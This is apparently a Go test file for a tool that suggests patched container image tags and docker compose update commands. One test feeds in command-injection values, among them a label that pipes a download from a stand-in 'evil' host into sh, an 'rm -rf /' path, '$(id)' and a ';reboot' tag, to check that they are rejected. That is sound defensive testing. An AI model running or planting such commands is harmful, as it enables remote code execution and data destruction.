// SPDX-License-Identifier: Apache-2.0

package remedy

import (
	"testing"
	"testing/fstest"

	"github.com/bifrost0x/varde/internal/catalog"
	"github.com/bifrost0x/varde/internal/inventory"
)

const tail = `
advisories: {coverage: limited, notes: test}
maintainers_of_entry: [bifrost0x]
verified: 2026-11-09
`

func load(t *testing.T) *catalog.Catalog {
	t.Helper()
	cat, err := catalog.Load(fstest.MapFS{
		"immich.yaml": {Data: []byte(`id: immich
name: Immich
homepage: https://immich.app
images: [{match: ghcr.io/immich-app/immich-server}]
version: {scheme: semver}` + tail)},
		"sonarr.yaml": {Data: []byte(`id: sonarr
name: Sonarr
homepage: https://sonarr.tv
images: [{match: lscr.io/linuxserver/sonarr, flavor: lsio}]
version: {scheme: semver}` + tail)},
		"nginx.yaml": {Data: []byte(`id: nginx
name: nginx
homepage: https://nginx.org
images: [{match: library/nginx}]
version: {scheme: semver}` + tail)},
	}, nil)
	if err != nil {
		t.Fatal(err)
	}
	return cat
}

func TestSuggest(t *testing.T) {
	cat := load(t)
	app := func(id string) *catalog.App { a, _ := cat.App(id); return a }
	composeLabels := map[string]string{
		labelProject: "immich", labelService: "immich-server",
		labelWorkingDir: "/opt/immich", labelConfigFiles: "/opt/immich/docker-compose.yml,/opt/immich/override.yml",
	}
	immichTags := []string{"v1.120.0", "v1.120.1", "v1.121.0", "v1.122.0", "release", "main", "v1.121.0-rc1", "pr-123"}

	s, ok := Suggest(app("immich"), &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:v1.120.0", Labels: composeLabels}, "1.120.1", immichTags)
	if !ok || s.Tag != "v1.120.1" || !s.Verified || s.Image != "ghcr.io/immich-app/immich-server:v1.120.1" {
		t.Errorf("lowest fixing tag: %+v", s)
	}
	if s.Compose == nil || s.Compose.Service != "immich-server" || s.Compose.Dir != "/opt/immich" || len(s.Compose.Files) != 2 ||
		s.Compose.Pull() != "docker compose pull 'immich-server' && docker compose up -d 'immich-server'" {
		t.Errorf("compose: %+v", s.Compose)
	}
	// No tag list: the running form, not verified.
	s, ok = Suggest(app("immich"), &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:v1.120.0"}, "1.121.0", nil)
	if !ok || s.Tag != "v1.121.0" || s.Verified || s.Compose != nil {
		t.Errorf("unverified: %+v", s)
	}
	// Only a release candidate fixes it: no verified suggestion.
	if s, _ := Suggest(app("immich"), &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:v1.122.0"}, "1.122.1", []string{"v1.122.0", "v1.123.0-rc1"}); s.Verified {
		t.Errorf("pre-release suggested: %+v", s)
	}
	// Nothing in the list fixes it: unverified guess.
	if s, _ := Suggest(app("immich"), &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:v1.120.0"}, "1.130.0", immichTags); s.Verified {
		t.Errorf("verified without a tag: %+v", s)
	}
	// Variants stay: an alpine image gets an alpine tag.
	nginxTags := []string{"1.27.3", "1.27.3-alpine", "1.27.4", "1.27.4-alpine", "1.27.4-alpine-slim", "1.28.0-alpine"}
	s, _ = Suggest(app("nginx"), &inventory.Container{ImageRef: "nginx:1.27.3-alpine"}, "1.27.4", nginxTags)
	if s.Tag != "1.27.4-alpine" || s.Image != "nginx:1.27.4-alpine" {
		t.Errorf("variant: %+v", s)
	}
	// linuxserver.io builds: the newest build of the fixing release.
	lsio := []string{"4.0.14.2939-ls270", "4.0.15.2941-ls275", "4.0.15.2941-ls276", "4.0.16.2944-ls280"}
	s, _ = Suggest(app("sonarr"), &inventory.Container{ImageRef: "lscr.io/linuxserver/sonarr:4.0.14.2939-ls270"}, "4.0.15.2941", lsio)
	if s.Tag != "4.0.15.2941-ls276" || !s.Verified {
		t.Errorf("lsio: %+v", s)
	}
	// A build number cannot be guessed without the list.
	if _, ok := Suggest(app("sonarr"), &inventory.Container{ImageRef: "lscr.io/linuxserver/sonarr:4.0.14.2939-ls270"}, "4.0.15.2941", nil); ok {
		t.Error("guessed a linuxserver.io build")
	}
	// Floating tags: pull again.
	if s, ok := Suggest(app("immich"), &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:release"}, "1.121.0", immichTags); !ok || !s.Floating || s.Tag != "" {
		t.Errorf("floating: %+v", s)
	}
	// Registry port in the name and digest-only references.
	s, _ = Suggest(app("immich"), &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:v1.120.0@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}, "1.121.0", immichTags)
	if s.Image != "ghcr.io/immich-app/immich-server:v1.121.0" {
		t.Errorf("tag and digest: %+v", s)
	}
	if _, ok := Suggest(app("immich"), &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}, "1.121.0", nil); ok {
		t.Error("digest only")
	}
	if _, ok := Suggest(nil, &inventory.Container{}, "1", nil); ok {
		t.Error("no app")
	}
	if got := imageName("registry.local:5000/team/app:1.0"); got != "registry.local:5000/team/app" {
		t.Errorf("imageName: %s", got)
	}
}

// Compose labels and registry tags are untrusted: an image sets any label,
// a registry lists any tag. Nothing that breaks the grammar reaches a line
// users paste.
func TestSuggestHostileInput(t *testing.T) {
	cat := load(t)
	immich, _ := cat.App("immich")
	hostile := map[string]string{
		labelProject: "x", labelService: "app; curl -fsS https://evil/x | sh; #",
		labelWorkingDir: "/opt/x; rm -rf /", labelConfigFiles: "/opt/x/compose.yml,$(id),/ok/compose.yml",
	}
	s, ok := Suggest(immich, &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:v1.120.0", Labels: hostile}, "1.121.0", nil)
	if !ok || s.Compose != nil {
		t.Errorf("hostile service label kept: %+v", s.Compose)
	}
	hostile[labelService] = "app"
	s, _ = Suggest(immich, &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:v1.120.0", Labels: hostile}, "1.121.0", nil)
	if s.Compose == nil || s.Compose.Dir != "" || len(s.Compose.Files) != 2 || s.Compose.Files[1] != "/ok/compose.yml" {
		t.Errorf("paths: %+v", s.Compose)
	}
	win := map[string]string{labelProject: "x", labelService: "app", labelWorkingDir: `C:\Users\me\stack`}
	if s, _ := Suggest(immich, &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:v1.120.0", Labels: win}, "1.121.0", nil); s.Compose == nil || s.Compose.Dir != `C:\Users\me\stack` {
		t.Errorf("windows path: %+v", s.Compose)
	}
	// A tag outside the grammar from the registry is not suggested.
	if s, _ := Suggest(immich, &inventory.Container{ImageRef: "ghcr.io/immich-app/immich-server:v1.120.0"}, "1.121.0", []string{"v1.121.0;reboot"}); s.Verified {
		t.Errorf("hostile tag verified: %+v", s)
	}
	if _, ok := Suggest(immich, &inventory.Container{ImageRef: "ghcr.io/Immich-App/x;id:v1.120.0"}, "1.121.0", nil); ok {
		t.Error("reference outside the grammar")
	}
}
